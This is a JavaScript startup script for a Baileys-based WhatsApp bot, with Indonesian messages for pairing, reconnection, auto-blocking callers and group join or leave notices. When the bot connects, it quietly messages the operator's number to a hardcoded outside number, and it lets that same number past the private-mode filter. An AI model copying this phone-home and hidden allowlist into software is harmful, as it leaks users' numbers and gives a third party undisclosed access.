require("./all/global")
const func = require("./all/place")
const readline = require("readline")
const welcome = JSON.parse(fs.readFileSync("./all/database/welcome.json"))
const usePairingCode = true
const question = (text) => {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    })
    return new Promise((resolve) => {
        rl.question(text, resolve)
    })
}

async function startSesi() {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
    const { state, saveCreds } = await useMultiFileAuthState(`./session`)
    const { version, isLatest } = await fetchLatestBaileysVersion()

    const connectionOptions = {
        version: [2, 3000, 1015901307],
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "fatal" }),
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        getMessage: async (key) => {
            if (store) {
                const msg = await store.loadMessage(key.remoteJid, key.id, undefined)
                return msg?.message || undefined
            }
            return {
                conversation: 'WhatsApp Bot By Fatt'
            }
        }
    }

    const Skyzo = func.makeWASocket(connectionOptions)
    if (usePairingCode && !Skyzo.authState.creds.registered) {
        const phoneNumber = await question(chalk.cyan.bold('Masukan Nomor Whatsapp Awali dengan 62\nContoh : 62838XXX\n'))
        const code = await Skyzo.requestPairingCode(phoneNumber.trim())
        console.log(`${chalk.cyan.bold('Kode Verifikasi Kamu')} : ${chalk.redBright.bold(code.split("").join(" "))}`)
    }
    store?.bind(Skyzo.ev)

    Skyzo.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output.statusCode
            console.log(color(lastDisconnect.error, 'deeppink'))
            if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
                process.exit()
            } else if (reason === DisconnectReason.badSession) {
                console.log(color(`Bad Session File, Please Delete Session and Scan Again`))
                process.exit()
            } else if (reason === DisconnectReason.connectionClosed) {
                console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'))
                process.exit()
            } else if (reason === DisconnectReason.connectionLost) {
                console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'))
                process.exit()
            } else if (reason === DisconnectReason.connectionReplaced) {
                console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'))
                Skyzo.logout()
            } else if (reason === DisconnectReason.loggedOut) {
                console.log(color(`Device Logged Out, Please Scan Again And Run.`))
                Skyzo.logout()
            } else if (reason === DisconnectReason.restartRequired) {
                console.log(color('Restart Required, Restarting...'))
                await startSesi()
            } else if (reason === DisconnectReason.timedOut) {
                console.log(color('Connection TimedOut, Reconnecting...'))
                startSesi()
            }
        } else if (connection === "connecting") {
            console.log(chalk.cyan.bold('Menghubungkan . . . '))
        } else if (connection === "open") {
            let teksnotif = `*Techsmith* Berhasil Tersambung Ke Nomor WhatsApp ${Skyzo.user.id.split(":")[0]}`
            Skyzo.sendMessage("628566534145@s.whatsapp.net", { text: teksnotif })
            console.log(chalk.cyan.bold('Bot Berhasil Tersambung'))
        }
    })

    Skyzo.ev.on('call', async (user) => {
        if (!global.anticall) return
        for (let ff of user) {
            if (ff.isGroup == false) {
                if (ff.status == "offer") {
                    let sendcall = await Skyzo.sendMessage(ff.from, { text: `@${ff.from.split("@")[0]} Maaf Kamu Akan Saya Block Karna Ownerbot Menyalakan Fitur *Anticall*\nJika Tidak Sengaja Segera Hubungi Owner Untuk Membuka Blokiran Ini`, contextInfo: { mentionedJid: [ff.from], externalAdReply: { showAdAttribution: true, thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ CALL DETECTED ｣", previewType: "PHOTO" } } }, { quoted: null })
                    Skyzo.sendContact(ff.from, [owner], "Developer WhatsApp Bot", sendcall)
                    await sleep(10000)
                    await Skyzo.updateBlockStatus(ff.from, "block")
                }
            }
        }
    })

    Skyzo.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            m = chatUpdate.messages[0]
            if (!m.message) return
            m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
            if (m.isBaileys) return
            if (m.key && m.key.remoteJid === 'status@broadcast') {
                if (global.autoreadsw) Skyzo.readMessages([m.key])
            }
            let fill = [global.owner, "628566534145"]
            if (!Skyzo.public && !fill.includes(m.key.remoteJid.split("@")[0]) && !m.key.fromMe && chatUpdate.type === 'notify') return
            if (global.autoread) Skyzo.readMessages([m.key])
            m = func.smsg(Skyzo, m, store)
            require("./Reza")(Skyzo, m, store)
        } catch (err) {
            console.log(err)
        }
    })

    Skyzo.ev.on('group-participants.update', async (anu) => {
        if (!welcome.includes(anu.id)) return
        let botNumber = await Skyzo.decodeJid(Skyzo.user.id)
        if (anu.participants.includes(botNumber)) return
        try {
            let metadata = await Skyzo.groupMetadata(anu.id)
            let namagc = metadata.subject
            let participants = anu.participants
            for (let num of participants) {
                let check = anu.author !== num && anu.author.length > 1
                let tag = check ? [anu.author, num] : [num]
                try {
                    ppuser = await Skyzo.profilePictureUrl(num, 'image')
                } catch {
                    ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
                }
                if (anu.action == 'add') {
                    Skyzo.sendMessage(anu.id, {
                        text: check ? `@${anu.author.split("@")[0]} Telah Menambahkan @${num.split("@")[0]} Ke Dalam Grup Ini` : `Hallo Kak @${num.split("@")[0]} Selamat Datang Di *${namagc}*`,
                        contextInfo: { mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Welcome Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1 } }
                    })
                } else if (anu.action == 'remove') {
                    Skyzo.sendMessage(anu.id, {
                        text: check ? `@${anu.author.split("@")[0]} Telah Mengeluarkan @${num.split("@")[0]} Dari Grup Ini` : `@${num.split("@")[0]} Telah Keluar Dari Grup Ini`,
                        contextInfo: { mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Leaving Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1 } }
                    })
                } else if (anu.action == "promote") {
                    Skyzo.sendMessage(anu.id, {
                        text: `@${anu.author.split("@")[0]} Telah Menjadikan @${num.split("@")[0]} Sebagai Admin Grup Ini`,
                        contextInfo: { mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Promote Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1 } }
                    })
                } else if (anu.action == "demote") {
                    Skyzo.sendMessage(anu.id, {
                        text: `@${anu.author.split("@")[0]} Telah Memberhentikan @${num.split("@")[0]} Sebagai Admin Grup Ini`,
                        contextInfo: { mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Demote Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1 } }
                    })
                }
            }
        } catch (err) {
            console.log(err)
        }
    })

    Skyzo.public = true

    Skyzo.ev.on('creds.update', saveCreds)
    return Skyzo
}

startSesi()

process.on('uncaughtException', function (err) {
    console.log('Caught exception: ', err)
})